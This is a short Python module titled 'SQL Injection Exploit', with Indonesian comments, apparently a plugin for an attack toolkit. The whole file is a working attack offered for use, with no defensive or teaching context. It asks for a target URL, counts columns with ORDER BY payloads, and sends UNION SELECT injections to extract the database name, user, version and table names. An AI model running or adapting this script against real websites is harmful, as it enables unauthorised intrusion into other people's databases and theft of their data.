DESCRIPTION = "SQL Injection Exploit"
def run():
    import requests
    
    target = input("URL target (ex: http://site.com/page.php?id=1): ")
    
    print("[*] Deteksi jumlah kolom...")
    col_count = 0
    for i in range(1, 30):
        url = target + f"+ORDER+BY+{i}--+-"
        try:
            r = requests.get(url, timeout=5)
            if "error" in r.text.lower() or len(r.text) < 100:
                col_count = i - 1
                break
        except:
            pass
    
    if col_count == 0:
        print("[-] Tidak bisa deteksi kolom.")
        return
    
    print(f"[+] Kolom: {col_count}")
    
    # Buat UNION SELECT
    nulls = ",".join(["NULL"]*(col_count-1))
    
    # Ekstrak nama database
    union_db = f"{nulls},database()"
    url = target + f"+UNION+SELECT+ALL+{union_db}--+-"
    try:
        r = requests.get(url, timeout=5)
        print(f"[+] Database: {r.text.split('NULL')[-1].strip()}")
    except:
        print("[!] Gagal ekstrak database.")
    
    # Ekstrak user
    union_user = f"{nulls},user()"
    url = target + f"+UNION+SELECT+ALL+{union_user}--+-"
    try:
        r = requests.get(url, timeout=5)
        print(f"[+] User: {r.text.split('NULL')[-1].strip()}")
    except:
        pass
    
    # Ekstrak versi
    union_ver = f"{nulls},version()"
    url = target + f"+UNION+SELECT+ALL+{union_ver}--+-"
    try:
        r = requests.get(url, timeout=5)
        print(f"[+] Version: {r.text.split('NULL')[-1].strip()}")
    except:
        pass
    
    # Tabel
    union_tables = f"{nulls},table_name"
    url = target + f"+UNION+SELECT+ALL+{union_tables}+FROM+information_schema.tables+WHERE+table_schema=database()--+-"
    try:
        r = requests.get(url, timeout=5)
        print(f"[+] Tabel: {r.text}")
    except:
        pass
